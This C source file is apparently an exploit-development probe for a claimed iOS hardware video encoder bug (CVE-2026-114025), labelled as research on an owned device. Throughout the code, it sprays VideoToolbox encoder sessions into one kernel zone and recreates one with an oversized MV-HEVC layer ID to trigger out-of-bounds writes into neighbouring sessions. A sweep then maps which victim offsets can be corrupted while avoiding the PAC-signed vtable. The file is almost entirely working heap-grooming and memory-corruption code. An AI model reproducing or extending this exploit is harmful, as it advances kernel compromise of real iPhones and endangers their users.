/*
 * ave_selective_oob.c — CVE-2026-114025 Selective OOB Write Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Key insight: The encoder session's offset 0x000 is a PAC-signed vtable.
 * ANY OOB write touching bytes 0x000-0x007 causes PAC failure = crash.
 * We MUST use layer_ids that skip the vtable region.
 *
 * Safe first layer_ids (avoid vtable at victim 0x000-0x007):
 *   VPS  190 → victim 0x012-0x019 writes (1,0)
 *   PPS2 180 → victim 0x013-0x01A writes (3,0)
 *   SPS  187 → victim 0x016-0x01D writes (2,timer)
 *   PPS1 183 → victim 0x00F-0x016 writes (3,1)
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOKit
 *        -o AVESelectiveOOB ave_selective_oob.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.aveselectoob
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

/* IOKit not needed — this probe uses only VideoToolbox API */

static FILE *g_log = NULL;
static volatile int g_encode_done = 0;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    rlog("  [CB] status=%d flags=0x%x\n", (int)status, (unsigned)flags);
    g_encode_done = 1;
}

static CVPixelBufferRef create_pb(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

typedef struct {
    VTCompressionSessionRef session;
    int layer_id;
    int alive;
} encoder_slot;

static VTCompressionSessionRef create_hw_encoder(int w, int h, int layer_id) {
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);

    if (st != noErr || !session) return NULL;

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);

    int base = 0;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NULL;
    }
    return session;
}

static int trigger_encode(VTCompressionSessionRef session, int w, int h) {
    CVPixelBufferRef pb = create_pb(w, h);
    if (!pb) return -1;

    g_encode_done = 0;
    CMTime pts = CMTimeMake(0, 30);
    CMTime dur = CMTimeMake(1, 30);
    OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
    if (st == noErr) {
        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        for (int i = 0; i < 50 && !g_encode_done; i++) usleep(10000);
    }
    CVPixelBufferRelease(pb);
    return (int)st;
}

/*
 * Phase: Spray & Probe
 * Creates N encoder sessions (all same type → same kalloc zone),
 * then selectively triggers OOB on chosen sessions to test which
 * victim offsets are survivable (no PAC crash).
 */
static void phase_selective_oob(int spray_count, int attacker_idx,
                                int target_lid, int w, int h) {
    rlog("\n=== SELECTIVE OOB: spray=%d, attacker=%d, lid=%d ===\n",
         spray_count, attacker_idx, target_lid);

    int safe_lid = 1;
    encoder_slot *slots = calloc(spray_count, sizeof(encoder_slot));
    if (!slots) { rlog("alloc failed\n"); return; }

    rlog("[1] Spraying %d encoder sessions with safe lid=%d...\n",
         spray_count, safe_lid);
    int created = 0;
    for (int i = 0; i < spray_count; i++) {
        slots[i].layer_id = safe_lid;
        slots[i].session = create_hw_encoder(w, h, safe_lid);
        slots[i].alive = (slots[i].session != NULL) ? 1 : 0;
        if (slots[i].alive) created++;
    }
    rlog("  Created %d/%d sessions\n", created, spray_count);

    if (attacker_idx >= spray_count || !slots[attacker_idx].alive) {
        rlog("  Attacker slot %d not available\n", attacker_idx);
        goto cleanup;
    }

    rlog("[2] Releasing attacker slot %d, recreating with OOB lid=%d...\n",
         attacker_idx, target_lid);
    VTCompressionSessionInvalidate(slots[attacker_idx].session);
    CFRelease(slots[attacker_idx].session);
    slots[attacker_idx].session = NULL;
    usleep(50000);

    slots[attacker_idx].session = create_hw_encoder(w, h, target_lid);
    slots[attacker_idx].layer_id = target_lid;
    if (!slots[attacker_idx].session) {
        rlog("  FAILED to create attacker with lid=%d\n", target_lid);
        slots[attacker_idx].alive = 0;
        goto cleanup;
    }
    rlog("  Attacker created with lid=%d\n", target_lid);

    rlog("[3] Encoding on VICTIM sessions (before OOB)...\n");
    int victim_before = 0;
    for (int i = 0; i < spray_count; i++) {
        if (i == attacker_idx || !slots[i].alive) continue;
        int st = trigger_encode(slots[i].session, w, h);
        if (st == 0) victim_before++;
    }
    rlog("  %d victims encoded successfully before OOB\n", victim_before);

    rlog("[4] Triggering OOB encode on attacker (lid=%d)...\n", target_lid);
    int att_st = trigger_encode(slots[attacker_idx].session, w, h);
    rlog("  Attacker encode status: %d\n", att_st);

    rlog("[5] Encoding on VICTIM sessions (after OOB)...\n");
    int victim_after = 0;
    int victim_crashed = 0;
    for (int i = 0; i < spray_count; i++) {
        if (i == attacker_idx || !slots[i].alive) continue;
        int st = trigger_encode(slots[i].session, w, h);
        if (st == 0) {
            victim_after++;
        } else {
            victim_crashed++;
            rlog("  ** Victim %d FAILED after OOB: status=%d\n", i, st);
        }
    }
    rlog("  After OOB: %d ok, %d failed (of %d victims)\n",
         victim_after, victim_crashed, victim_before);

    if (victim_crashed > 0) {
        rlog("\n  !! VICTIM(S) CRASHED — OOB write hit a critical field\n");
        rlog("  !! lid=%d writes at victim offset 0x%03x-0x%03x\n",
             target_lid,
             (0x432 + target_lid * 16) - 0x1000,
             (0x432 + target_lid * 16) - 0x1000 + 7);
    } else if (victim_before > 0 && victim_after == victim_before) {
        rlog("\n  ** ALL VICTIMS SURVIVED — field at this offset is safe to corrupt\n");
        rlog("  ** lid=%d writes at victim offset 0x%03x-0x%03x\n",
             target_lid,
             (0x432 + target_lid * 16) - 0x1000,
             (0x432 + target_lid * 16) - 0x1000 + 7);
    }

cleanup:
    rlog("[6] Cleanup...\n");
    for (int i = 0; i < spray_count; i++) {
        if (slots[i].session) {
            VTCompressionSessionInvalidate(slots[i].session);
            CFRelease(slots[i].session);
        }
    }
    free(slots);
}

/*
 * Phase: Sweep — test multiple layer_ids to map which victim offsets survive
 */
static void phase_sweep(int spray_count, int attacker_idx, int w, int h) {
    rlog("\n=== SWEEP: Testing safe layer_ids to map victim fields ===\n");

    /* Test VPS table layer_ids that skip the vtable */
    int test_lids[] = {
        190,  /* victim 0x012-0x019 — first safe VPS write */
        191,  /* victim 0x022-0x029 */
        192,  /* victim 0x032-0x039 */
        193,  /* victim 0x042-0x049 */
        194,  /* victim 0x052-0x059 */
        195,  /* victim 0x062-0x069 */
        200,  /* victim 0x0B2-0x0B9 */
        210,  /* victim 0x152-0x159 */
        220,  /* victim 0x1F2-0x1F9 */
        230,  /* victim 0x292-0x299 */
        240,  /* victim 0x332-0x339 */
        250,  /* victim 0x3D2-0x3D9 */
    };
    int n_tests = sizeof(test_lids) / sizeof(test_lids[0]);

    for (int t = 0; t < n_tests; t++) {
        int lid = test_lids[t];
        int victim_off = (0x432 + lid * 16) - 0x1000;
        rlog("\n--- Test %d/%d: lid=%d → victim 0x%03x-0x%03x ---\n",
             t+1, n_tests, lid, victim_off, victim_off + 7);
        phase_selective_oob(spray_count, attacker_idx, lid, w, h);
        usleep(200000);
    }
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_selective_oob.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 Selective OOB Probe ===\n");
    rlog("Avoids PAC-signed vtable at victim offset 0x000\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "help";
    int W = 128, H = 128;
    int SPRAY = 24;
    int ATTACKER = 12;

    if (strcmp(mode, "single") == 0) {
        int lid = (argc > 2) ? atoi(argv[2]) : 190;
        if (lid < 190) {
            rlog("WARNING: lid=%d may touch vtable! Minimum safe VPS lid=190\n", lid);
            rlog("Proceeding anyway (for research)...\n");
        }
        phase_selective_oob(SPRAY, ATTACKER, lid, W, H);

    } else if (strcmp(mode, "sweep") == 0) {
        phase_sweep(SPRAY, ATTACKER, W, H);

    } else if (strcmp(mode, "unsafe_189") == 0) {
        rlog("\n!! UNSAFE MODE: lid=189 WILL touch vtable at 0x002 !!\n");
        rlog("!! This should cause PAC failure on adjacent session !!\n");
        rlog("!! Use to CONFIRM adjacency detection works !!\n\n");
        phase_selective_oob(SPRAY, ATTACKER, 189, W, H);

    } else {
        rlog("Usage: AVESelectiveOOB <mode> [args]\n");
        rlog("  single [lid]   -- test single layer_id (default 190)\n");
        rlog("  sweep           -- sweep safe layer_ids to map victim fields\n");
        rlog("  unsafe_189      -- deliberately hit vtable (PAC crash test)\n");
        rlog("\nSafe VPS layer_ids: 190+ (skip vtable at 0x000)\n");
        rlog("Safe PPS2 layer_ids: 180+ (skip vtable)\n");
        rlog("Safe SPS layer_ids: 187+ (skip vtable)\n");
        rlog("Safe PPS1 layer_ids: 183+ (skip vtable)\n");
    }

    rlog("\n=== Probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
